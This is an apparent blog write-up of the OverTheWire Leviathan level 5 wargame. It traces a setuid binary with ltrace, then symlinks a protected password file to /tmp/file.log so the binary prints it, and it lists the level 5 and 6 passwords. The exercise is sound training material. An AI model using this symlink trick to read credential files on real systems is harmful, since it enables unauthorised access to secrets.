---
layout: post
date:   2021-04-18 09:00:00 +0100
categories: OverTheWire Leviathan
---


# Leviathan 5
```

Username: leviathan5
Password: Tith4cokei

Data for the levels can be found in **the homedirectories**. You can look at **/etc/leviathan\_pass** for the various level passwords.
```


## Lets take a look.

```bash
leviathan5@leviathan:~$ ls
leviathan5
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
```

## Another ltrace

```bin
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                               = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                         = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

## Mkay, lets create the file and re-do that

```bash
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                               = 0x804b008
fgetc(0x804b008)                                                          = '\377'
feof(0x804b008)                                                           = 1
fclose(0x804b008)                                                         = 0
getuid()                                                                  = 12005
setuid(12005)                                                             = 0
unlink("/tmp/file.log")                                                   = 0
+++ exited (status 0) +++
```

### So fopen opens the file and unlink removes the file. I'm guessing we need to use the whole file link as previous

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```

VICTORY.

```
UgaoFee4li 
```
